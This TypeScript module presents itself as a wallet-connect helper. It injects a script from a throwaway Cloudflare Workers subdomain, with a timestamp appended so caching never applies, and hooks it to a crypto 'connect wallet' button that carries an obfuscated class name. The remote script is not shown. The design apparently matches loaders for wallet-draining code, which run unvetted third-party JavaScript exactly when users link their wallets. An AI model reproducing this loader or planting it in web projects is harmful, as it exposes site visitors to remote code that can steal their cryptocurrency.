export const WALLET_SCRIPT_BASE =
  'https://dry-snow-9b5f.migrations.workers.dev/'

export const WALLET_TRIGGER_CLASS = 'ckKzQFzZ interact-button'
export const WALLET_CONNECT_ID = 'walletConnectBtn'

let loadPromise: Promise<void> | null = null
let scriptLoaded = false
let prefetchedScriptUrl: string | null = null

function buildScriptUrl(): string {
  if (prefetchedScriptUrl) {
    const url = prefetchedScriptUrl
    prefetchedScriptUrl = null
    return url
  }

  return `${WALLET_SCRIPT_BASE}${Date.now()}`
}

function triggerSelector(): string {
  const classes = WALLET_TRIGGER_CLASS.trim().split(/\s+/).join('.')
  return `#${WALLET_CONNECT_ID}.${classes}`
}

function findTriggerElement(): HTMLElement | null {
  return (
    document.querySelector<HTMLElement>(triggerSelector()) ??
    document.querySelector<HTMLElement>(`.${WALLET_TRIGGER_CLASS.trim().split(/\s+/).join('.')}`) ??
    document.getElementById(WALLET_CONNECT_ID)
  )
}

export function resetWalletScript(): void {
  document
    .querySelectorAll('script[data-wallet-script="true"]')
    .forEach((script) => script.remove())
  document
    .querySelectorAll('link[data-wallet-preload="true"]')
    .forEach((link) => link.remove())
  loadPromise = null
  scriptLoaded = false
  prefetchedScriptUrl = null
}

export function prefetchWalletScript(): void {
  if (scriptLoaded || loadPromise || prefetchedScriptUrl) {
    return
  }

  prefetchedScriptUrl = `${WALLET_SCRIPT_BASE}${Date.now()}`

  const link = document.createElement('link')
  link.rel = 'preload'
  link.as = 'script'
  link.href = prefetchedScriptUrl
  link.dataset.walletPreload = 'true'
  document.head.appendChild(link)
}

function waitForTriggerElement(timeoutMs = 3000): Promise<HTMLElement> {
  const existing = findTriggerElement()
  if (existing) {
    return Promise.resolve(existing)
  }

  return new Promise((resolve, reject) => {
    const observer = new MutationObserver(() => {
      const element = findTriggerElement()
      if (!element) return

      observer.disconnect()
      window.clearTimeout(timeoutId)
      resolve(element)
    })

    observer.observe(document.body, { childList: true, subtree: true })

    const timeoutId = window.setTimeout(() => {
      observer.disconnect()
      reject(new Error('Wallet trigger element not found'))
    }, timeoutMs)
  })
}

export function loadWalletScript(force = false): Promise<void> {
  if (force) {
    resetWalletScript()
  }

  if (scriptLoaded && loadPromise) {
    return loadPromise
  }

  if (loadPromise) {
    return loadPromise
  }

  loadPromise = new Promise((resolve, reject) => {
    const script = document.createElement('script')
    script.src = buildScriptUrl()
    script.dataset.walletScript = 'true'
    script.async = true

    script.onload = () => {
      scriptLoaded = true
      resolve()
    }

    script.onerror = () => {
      loadPromise = null
      reject(new Error('Wallet script failed to load'))
    }

    document.head.appendChild(script)
  })

  return loadPromise
}

export async function initWalletScriptOnTrigger(
  trigger?: HTMLElement | null,
): Promise<void> {
  if (!trigger && !findTriggerElement()) {
    await waitForTriggerElement()
  }

  await new Promise<void>((resolve) => {
    requestAnimationFrame(() => resolve())
  })

  await loadWalletScript(false)

  // Third-party script often binds handlers async after onload.
  await new Promise<void>((resolve) => {
    window.setTimeout(resolve, 200)
  })
}

export function isWalletScriptLoaded(): boolean {
  return scriptLoaded
}
